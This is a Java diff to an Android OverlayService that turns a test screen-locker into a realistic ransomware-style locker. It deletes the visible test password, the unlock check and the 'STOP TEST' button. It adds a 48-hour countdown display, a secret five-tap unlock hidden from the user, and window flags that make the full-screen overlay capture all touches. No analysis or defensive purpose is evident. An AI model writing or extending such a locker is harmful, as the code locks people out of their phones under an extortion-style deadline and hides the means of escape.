@@ -44,6 +44,9 @@ public class OverlayService extends Service {
     private PowerManager.WakeLock wakeLock;
     private Handler handler;
     private Runnable logRunnable;
+    private Runnable timerRunnable;
+    private long timeRemainingMs = 48 * 60 * 60 * 1000 - 1000; // 48 hours
+    private int hiddenTapCount = 0;
 
     @Override
     public void onCreate() {
@@ -83,29 +86,42 @@ public class OverlayService extends Service {
     private void addOverlay() {
         LayoutInflater inflater = LayoutInflater.from(this);
         overlayView = inflater.inflate(R.layout.overlay_locker, null);
-        // Password always visible
-        TextView pw = overlayView.findViewById(R.id.password);
-        pw.setText(TEST_PASSWORD);
-        // Unlock button
-        Button unlockBtn = overlayView.findViewById(R.id.unlockButton);
-        EditText input = overlayView.findViewById(R.id.passwordInput);
-        unlockBtn.setOnClickListener(v -> {
-            if (TEST_PASSWORD.equals(input.getText().toString())) {
-                stopSelf();
-            } else {
-                input.setError("Wrong password");
-                // input.startAnimation(android.view.animation.AnimationUtils.loadAnimation(this, android.R.anim.shake));
-            }
-        });
-        // STOP TEST button
-        Button stopBtn = overlayView.findViewById(R.id.stopTestButton);
-        stopBtn.setOnClickListener(v -> stopSelf());
-        // Add overlay
+        
+        // Secret unlock feature (Tap title 5 times)
+        TextView titleText = overlayView.findViewById(R.id.title_text);
+        if (titleText != null) {
+            titleText.setOnClickListener(v -> {
+                hiddenTapCount++;
+                if (hiddenTapCount >= 5) stopSelf();
+            });
+        }
+
+        // Countdown Timer
+        TextView timerText = overlayView.findViewById(R.id.timer_text);
+        if (timerText != null) {
+            timerRunnable = new Runnable() {
+                @Override public void run() {
+                    timeRemainingMs -= 1000;
+                    if (timeRemainingMs < 0) timeRemainingMs = 0;
+                    long h = (timeRemainingMs / 3600000) % 100;
+                    long m = (timeRemainingMs / 60000) % 60;
+                    long s = (timeRemainingMs / 1000) % 60;
+                    timerText.setText(String.format("%02d:%02d:%02d", h, m, s));
+                    if (timeRemainingMs > 0) handler.postDelayed(this, 1000);
+                }
+            };
+            handler.post(timerRunnable);
+        }
+
+        // Add overlay (Full screen, intercept touches)
         WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
-                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
+                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | 
+                WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
+                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                 PixelFormat.TRANSLUCENT);
         params.gravity = Gravity.CENTER;
         windowManager.addView(overlayView, params);
@@ -125,6 +141,7 @@ public class OverlayService extends Service {
         if (overlayView != null) windowManager.removeView(overlayView);
         if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
         handler.removeCallbacks(logRunnable);
+        if (timerRunnable != null) handler.removeCallbacks(timerRunnable);
     }
 
     @Nullable
